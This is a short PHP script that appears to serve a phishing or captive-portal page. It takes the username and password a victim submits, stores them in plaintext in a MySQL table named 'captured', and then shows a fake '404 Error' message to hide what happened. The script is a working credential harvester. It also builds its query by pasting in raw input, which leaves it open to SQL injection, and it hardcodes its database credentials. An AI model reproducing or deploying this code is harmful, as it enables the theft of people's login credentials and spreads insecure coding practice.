<?php
ini_set('display_errors', 'On');
$servername = "localhost";
$username = "max";
$password = "desktop";
$dbname = "captured";
// Create connection
$conn = new mysqli($servername, $username, $password,$dbname);

// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}

$user = $_POST['auth_user'];
$pass = $_POST['auth_pass'];

$sql = "INSERT INTO captured (username, password)
VALUES ('$user', '$pass')";

if ($conn->query($sql) === TRUE) {
echo "404 Error";
} else {
echo "Error: " . $sql . "<br>" . $conn->error;
}$conn->close();
?>
